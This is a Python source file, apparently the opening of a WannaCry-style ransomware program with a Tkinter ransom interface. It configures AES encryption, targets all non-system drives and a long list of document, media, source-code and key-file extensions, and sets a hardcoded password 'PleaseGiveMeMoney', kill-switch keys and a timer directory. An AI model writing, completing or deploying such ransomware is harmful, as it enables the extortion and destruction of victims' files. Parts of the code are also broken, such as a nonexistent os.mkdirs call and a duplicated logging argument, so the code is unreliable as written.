import os, sys, requests, json
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes
import base64, uuid, time, ctypes, logging, threading
import tkinter as tk
from tkinter import messagebox, filedialog, simpledialog
from datetime import datetime, timedelta
from tkinter import ttk
from PIL import Image, ImageTk


def resource_path(relative_path):
    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base_path, relative_path)

def time_dir_exists():
    if not os.path.exists(TIME_DIR):
        os.mkdirs(TIME_DIR)

def load_machine_id():
    drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    for drive in drives:
        machine_id_path = os.path.join(drive, "machine_id.txt")
        if os.path.exists(machine_id_path):
            try:
                with open(machine_id_path, 'r') as f:
                    machine_id = f.read().strip()
                    print(f"Successfully found machine id from {machine_id_path}: {machine_id}")
                    return machine_id
            except FileNotFoundError:
                continue
    return None

TERMINATION_KEY = "bingo"
SECONDARY_TERMINATION_KEY = "stop"
HOME_DIR = os.path.expanduser("~")
TIME_DIR = os.path.join(HOME_DIR, '.wannacry_time')
TIME_STATE_DIR = os.path.join(TIME_DIR, 'timer_state.txt')
WALLPAPER_PATH = resource_path('resources/wallpaper.png')
ICON_PATH = resource_path('resources/skull.ico')
THANKYOU_PATH = resource_path('resources/thanks.png')
WIN_DIR = os.environ.get("SYSTEMDRIVE")

time_dir_exists()

DRIVES_TO_ENCRYPT = [f'{d}:\\' for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f'{d}:\\') and f'{d}:'!=WIN_DIR]
EXTENSIONS_TO_ENCRYPT = [".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx", ".csv", ".html", ".htm", ".xml", ".json", 
".zip", ".rar", ".tar", ".gz", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".svg", ".mp3", ".wav", ".aac", ".ogg", ".mp4", ".avi", ".mov", 
".wmv", ".mkv", ".exe", ".msi", ".apk", ".bat", ".sh", ".dll", ".iso", ".img", ".dmg", ".psd", ".ai", ".indd", ".svgz", ".eps", ".webp", ".yml", ".yaml",
".md", ".log", ".sql", ".bak", ".pem", ".cer", ".crt", ".p12", ".pfx", ".key", ".jks", ".nupkg", ".whl", ".class", ".jar", ".pl", ".py", ".rb", ".go", ".c", ".cpp", ".h", ".cs",
".swift", ".php", ".asp", ".jsp", ".vb", ".properties", ".torrent"]
PASSWORD_PROVIDED = "PleaseGiveMeMoney"
DASHBOARD_URL = 'http://localhost/'
MAX_ATTEMPTS = 10
DELAY = 5

logging.basicConfig(
    filemode='encryption_log.txt',
    level=logging.INFO,
    format='%(asctime)s:%(levelname)s:%(message)s',
    filemode='w'
)
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s:%(levelname)s:%(message)s')
console_handler.setFormatter(formatter)
logging.getLogger().addHandler(console_handler)